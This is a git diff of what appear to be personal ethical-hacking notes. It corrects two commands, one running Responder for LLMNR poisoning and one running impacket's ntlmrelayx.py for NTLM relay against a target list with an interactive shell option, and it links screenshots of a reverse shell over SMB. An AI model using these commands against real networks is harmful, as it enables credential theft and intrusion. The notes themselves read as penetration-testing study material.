@@ -12,7 +12,7 @@
 - needs traffic - ideal before nmap/nessus scans
 - Responder:
 
-  `python /usr/share/responder/Responder.py -L eth0 -rdwv`
+  `python /usr/share/responder/Responder.py -I eth0 -rdwv`
 
   a) try to access attacker IP address::  ![llmnr_poison](https://github.com/crcirq32/Notes/blob/main/Ethical/Screenshots/admin_malz_llmnr_poison.png)
 
@@ -26,7 +26,7 @@
 - setup ntlmrelay:: \  ![ntlmrelay.py](https://github.com/crcirq32/Notes/blob/main/Ethical/Screenshots/ntlmrelay_py.png)
   a) Find machines w/ smb enabled: Nessus or Nmap: \
 
-`/opt/impacket/examples/$ python3ntlmrelayx.py -tf targets.txt -smb2support (-i) #python3 -m pip install . ## -i interactive`
+`/opt/impacket/examples/$ python3 ntlmrelayx.py -tf targets.txt -smb2support (-i) #python3 -m pip install . ## -i interactive`
 
 - Working but keeps failing::  ![revmalz](https://github.com/crcirq32/Notes/blob/main/Ethical/Screenshots/revshell_smb_malz.png)
   &&  ![break](https://github.com/crcirq32/Notes/blob/main/Ethical/Screenshots/malz_smb_breaking.png)
